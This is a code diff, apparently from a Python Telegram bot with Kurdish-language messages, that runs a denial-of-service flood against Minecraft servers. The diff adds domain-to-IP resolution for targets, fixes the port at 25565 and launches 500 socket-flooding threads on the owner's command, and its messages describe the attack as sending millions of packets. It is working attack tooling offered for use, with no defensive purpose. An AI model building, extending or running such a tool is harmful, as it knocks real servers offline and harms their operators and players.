@@ -7,15 +7,20 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 TOKEN = os.getenv("BOT_TOKEN")
-# خوێندنەوەی ئایدی خاوەن لە Secrets و گۆڕینی بۆ ژمارە
 OWNER_ID = int(os.getenv("OWNER_ID", "0"))
 
 user_states = {}
 attack_active = False
 attack_stats = {"success": 0, "failed": 0}
 
-def flood_worker(ip, port):
+def flood_worker(host, port):
     global attack_active, attack_stats
+    # گۆڕینی دۆمەین (بۆ نموونە play.server.com) بۆ ئایپی ڕاستەقینە لە ڕێگەی DNSەوە
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        ip = host  # ئەگەر هەر ئایپی بوو خۆی بەکاریدێنێت
+
     while attack_active:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -64,12 +69,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id != OWNER_ID:
             await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت! تەنها خاوەنی فەرمی دەتوانێت هێرش ئەنجام بدات.")
             return
-        user_states[user_id] = "waiting_ip_port"
+        user_states[user_id] = "waiting_ip"
         await query.message.reply_text(
             "🎯 **ئامادەکاری بۆ هێرش:**\n\n"
-            "تکایە IP و Port سێرڤەری ماینکرافتەکە بنووسە بەم شێوازە:\n"
-            "`<IP> <PORT>`\n"
-            "نموونە: `play.server.com 25565`"
+            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە (بۆ نموونە):\n"
+            "`abysssmp@.playwithbao.com` یان `play.server.com`"
         )
 
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -79,15 +83,13 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id != OWNER_ID:
         return
 
-    if user_states.get(user_id) == "waiting_ip_port":
-        text = update.message.text.strip()
-        parts = text.split()
-        if len(parts) < 2:
-            await update.message.reply_text("🔥 هەڵە! تکایە هەردووکیشی بە دروستی بنووسە: `IP PORT`")
+    if user_states.get(user_id) == "waiting_ip":
+        host = update.message.text.strip()
+        if not host:
+            await update.message.reply_text("🔥 هەڵە! تکایە ناوی دۆمەین یان ئایپی دروست بنووسە.")
             return
 
-        ip = parts[0]
-        port = parts[1]
+        port = 25565  # پۆرتی نەگۆڕ و فەرمی جاڤا
         user_states[user_id] = None
 
         attack_active = True
@@ -95,14 +97,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         threads_count = 500
         for _ in range(threads_count):
-            t = threading.Thread(target=flood_worker, args=(ip, port))
+            t = threading.Thread(target=flood_worker, args=(host, port))
             t.daemon = True
             t.start()
 
         await update.message.reply_text(
             f"🌋 **هێرشی بۆڕکان دەستی پێکرد!**\n"
-            f"🎯 ئامانج: `{ip}:{port}`\n"
-            f"⚡️ بارودۆخ: ملیۆنەها بۆت و پاکێت بەرەو سێرڤەر دەنێردرێن...\n\n"
+            f"🎯 ئامانج: `{host}:{port}`\n"
+            f"⚡️ بارودۆخ: وەرگێڕانی دۆمەین و ناردنی ملیۆنەها پاکێت بۆ سێرڤەرەکەی ماینکرافت...\n\n"
             f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
             f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
         )
